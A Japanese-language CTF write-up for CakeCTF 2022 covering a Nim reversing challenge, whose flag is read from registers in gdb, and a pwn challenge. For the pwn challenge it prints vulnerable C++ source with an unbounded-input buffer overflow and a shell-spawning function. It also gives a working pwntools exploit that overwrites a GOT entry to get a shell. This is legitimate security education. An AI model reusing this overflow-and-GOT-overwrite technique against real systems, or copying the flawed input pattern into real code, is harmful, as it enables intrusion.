# CakeCTF 2022

> **Warning**
> 競技終了後に解いたため、内容については一切保証致しません。

- [CakeCTF 2022](#cakectf-2022)
  - [rev/nimrev](#revnimrev)
    - [solution](#solution)
    - [FLAG](#flag)
  - [pwn/str.vs.cstr](#pwnstrvscstr)
    - [solution](#solution-1)
    - [ref](#ref)

## rev/nimrev

warmup

Have you ever analysed programs written in languages other than C/C++?

### solution

実行例

```bash
$ ./chall
AAAAAAA
Wrong...
```

`NimMainModule`内の`readLine_systemZio_271`で標準入力から文字列を受け取ることがわかりました。
![](./images/rimrev.png)

`eqString`あたりで比較用の文字列がレジスタに現れるだろうと思い、ステップ実行を続けると`RCX: 0x7f4ec8eb20a0 ("CakeCTF{s0m3t1m3s_n0t_C}")`が現れました。


```bash
gdb-peda$
[----------------------------------registers-----------------------------------]
RAX: 0x18
RBX: 0x5579cd2f5070 (<__libc_csu_init>: endbr64)
RCX: 0x7f4ec8eb20a0 ("CakeCTF{s0m3t1m3s_n0t_C}")
RDX: 0x7f4ec8eb2090 --> 0x18
RSI: 0x0
RDI: 0xffffff82
RBP: 0x7ffe29560580 --> 0x7ffe29560590 --> 0x7ffe295605b0 --> 0x7ffe295605e0 --> 0x0
RSP: 0x7ffe29560540 --> 0x7f4ec8eb1050 --> 0x36 ('6')
RIP: 0x5579cd2f4fa4 (<NimMainModule+425>:       mov    edx,0x0)
R8 : 0x7f4ec8eb1060 ('A' <repeats 54 times>)
R9 : 0x7c ('|')
R10: 0x7f4ec910ebe0 --> 0x5579ce5b26a0 --> 0x0
R11: 0x246
R12: 0x5579cd2eb320 (<_start>:  endbr64)
R13: 0x7ffe295606d0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
```

フラグ発見時のPC

```bash
gdb-peda$ disass
Dump of assembler code for function NimMainModule:
   0x00005579cd2f4f73 <+376>:   mov    rdx,rax
   0x00005579cd2f4f76 <+379>:   call   0x5579cd2f4ad7 <map_main_11>
   0x00005579cd2f4f7b <+384>:   mov    QWORD PTR [rbp-0x30],rax
   0x00005579cd2f4f7f <+388>:   mov    QWORD PTR [rbp-0x28],0x0
   0x00005579cd2f4f87 <+396>:   cmp    QWORD PTR [rbp-0x30],0x0
   0x00005579cd2f4f8c <+401>:   je     0x5579cd2f4f97 <NimMainModule+412>
   0x00005579cd2f4f8e <+403>:   mov    rax,QWORD PTR [rbp-0x30]
   0x00005579cd2f4f92 <+407>:   mov    rax,QWORD PTR [rax]
   0x00005579cd2f4f95 <+410>:   jmp    0x5579cd2f4f9c <NimMainModule+417>
   0x00005579cd2f4f97 <+412>:   mov    eax,0x0
   0x00005579cd2f4f9c <+417>:   mov    rdx,QWORD PTR [rbp-0x30]
   0x00005579cd2f4fa0 <+421>:   lea    rcx,[rdx+0x10]
=> 0x00005579cd2f4fa4 <+425>:   mov    edx,0x0
   0x00005579cd2f4fa9 <+430>:   mov    rsi,rax
   0x00005579cd2f4fac <+433>:   mov    rdi,rcx
   0x00005579cd2f4faf <+436>:   call   0x5579cd2f49a9 <join_main_42>
   0x00005579cd2f4fb4 <+441>:   mov    QWORD PTR [rbp-0x28],rax
   0x00005579cd2f4fb8 <+445>:   mov    rdx,QWORD PTR [rbp-0x28]
   0x00005579cd2f4fbc <+449>:   mov    rax,QWORD PTR [rbp-0x40]
   0x00005579cd2f4fc0 <+453>:   mov    rsi,rdx
   0x00005579cd2f4fc3 <+456>:   mov    rdi,rax
   0x00005579cd2f4fc6 <+459>:   call   0x5579cd2f4c46 <eqStrings>
End of assembler dump.
gdb-peda$
```

### FLAG

```bash
CakeCTF{s0m3t1m3s_n0t_C}
```


## pwn/str.vs.cstr

Which do you like, C string or C++ string?

### solution

```bash
$ checksec --file=./chall
[*] 'chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ file ./chall
./chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3f2398faba2c3d21dae9eb476787cf24d420cd65, for GNU/Linux 3.2.0, not stripped
```

`main.cpp`を開くと`char _c_str[0x20];`から、`std::cin >> test.c_str();`でサイズ指定がないため、getsのようなBOFが起きそうなことがわかる。

```cpp
#include <array>
#include <iostream>

struct Test {
  Test() { std::fill(_c_str, _c_str + 0x20, 0); }
  char* c_str() { return _c_str; }
  std::string& str() { return _str; }

private:
  __attribute__((used))
  void call_me() {
    std::system("/bin/sh");
  }

  char _c_str[0x20];
  std::string _str;
};

int main() {
  Test test;

  std::setbuf(stdin, NULL);
  std::setbuf(stdout, NULL);

  std::cout << "1. set c_str" << std::endl
            << "2. get c_str" << std::endl
            << "3. set str" << std::endl
            << "4. get str" << std::endl;

  while (std::cin.good()) {
    int choice = 0;
    std::cout << "choice: ";
    std::cin >> choice;

    switch (choice) {
      case 1: // set c_str
        std::cout << "c_str: ";
        std::cin >> test.c_str();
        break;

      case 2: // get c_str
        std::cout << "c_str: " << test.c_str() << std::endl;
        break;

      case 3: // set str
        std::cout << "str: ";
        std::cin >> test.str();
        break;

      case 4: // get str
        std::cout << "str: " << test.str() << std::endl;
        break;

      default: // otherwise exit
        std::cout << "bye!" << std::endl;
        return 0;
    }
  }
  
  return 1;
}
```

`c_str`へのBOFを利用して、適当なGOTを書き換えて`Test::call_me`を呼び出す。

```python
# based on https://miso-24.hatenablog.com/entry/2022/09/04/173330#strvscstr
from subprocess import call
from pwn import *

binfile = "./chall"
context.binary = binfile
elf = ELF(binfile)

call_me = elf.symbols["_ZN4Test7call_meEv"]
got_sample = elf.got["_ZNKSt9basic_iosIcSt11char_traitsIcEE4goodEv"]

HOST='pwn1.2022.cakectf.com'
PORT=9003

conn = process(binfile)
# conn = remote(HOST, PORT)

conn.sendlineafter("choice:", "1")  # 1. set c_str

payload = b"A" * 0x20
payload += p64(got_sample)
conn.sendlineafter(":", payload)
conn.sendlineafter(":", "3")        # 3. set str
conn.sendlineafter(":", p64(call_me))

conn.interactive()
```

競技は終わっていたため、ローカルでのコマンドの呼び出しで確認しました。


```bash
$python solver.py
...
$ls
chall  main.cpp  str.py
```

### ref

- https://nanimokangaeteinai.hateblo.jp/entry/2022/09/09/235615#pwn-105-strvscstr-88-solves
- https://nanimokangaeteinai.hateblo.jp/entry/2022/09/09/235615#pwn-105-strvscstr-88-solves